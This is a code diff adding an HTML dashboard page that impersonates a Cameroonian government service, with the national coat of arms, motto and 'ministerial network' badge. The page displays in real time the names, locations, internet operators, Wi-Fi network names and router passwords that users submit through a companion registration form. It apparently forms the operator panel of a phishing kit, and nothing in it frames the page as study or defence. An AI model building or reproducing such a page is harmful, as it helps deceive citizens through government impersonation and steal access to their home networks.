@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Espace habilité — Tableau de suivi des dossiers</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <div class="flag-strip" aria-hidden="true"></div>
+    <div class="gov-top">
+      <span class="gov-top__motto">République du Cameroun · Paix – Travail – Patrie</span>
+      <span class="gov-top__secure">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path
+            d="M12 1L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-4z"
+            fill="currentColor"
+            opacity="0.9"
+          />
+        </svg>
+        Réseau ministériel
+      </span>
+    </div>
+    <nav class="site-nav" aria-label="Navigation principale">
+      <div class="site-nav__inner">
+        <div class="site-nav__links">
+          <a href="/index.html">Accueil</a>
+          <a href="/form.html">Enregistrement</a>
+          <a href="/admin.html" class="is-active">Espace habilité</a>
+        </div>
+      </div>
+    </nav>
+    <header class="header-main">
+      <div class="header-inner">
+        <div class="logo-block">
+          <img
+            class="coat"
+            src="/images/photo_2026-04-28_01-39-47.jpg"
+            width="56"
+            height="66"
+            alt="Armoiries de la République du Cameroun"
+          />
+          <div class="logo-text">
+            <span class="line1">Centre national de traitement</span>
+            <span class="line2">Flux entrants — recensement des équipements box</span>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main>
+      <p class="breadcrumb">
+        <a href="/index.html">Accueil</a> &nbsp;/&nbsp; <span>Espace habilité</span>
+      </p>
+      <div class="dashboard-header">
+        <h1 class="page-title" style="margin: 0">Tableau de suivi en direct</h1>
+        <span class="live-badge">
+          <span class="live-dot" aria-hidden="true"></span>
+          TEMPS RÉEL
+        </span>
+      </div>
+      <p style="color: var(--muted); margin-top: -0.35rem; margin-bottom: 1.35rem">
+        Affichage instantané des dossiers validés par les usagers (WebSocket). Les mots de passe
+        sont affichés uniquement dans cet espace restreint à personnel habilité.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Heure</th>
+              <th>Nom</th>
+              <th>Région</th>
+              <th>Ville</th>
+              <th>Opérateur</th>
+              <th>SSID</th>
+              <th>Mot de passe box</th>
+            </tr>
+          </thead>
+          <tbody id="dash-body">
+            <tr id="dash-empty">
+              <td colspan="7" class="empty-state">
+                Aucun dossier pour le moment. Soumettez le formulaire depuis la page d’enregistrement.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="footer-links">
+        <a href="/index.html">Accueil</a>
+        <a href="/form.html">Enregistrement</a>
+      </div>
+      <p style="margin: 0">Accès réservé — ne pas diffuser.</p>
+    </footer>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/script.js"></script>
+  </body>
+</html>
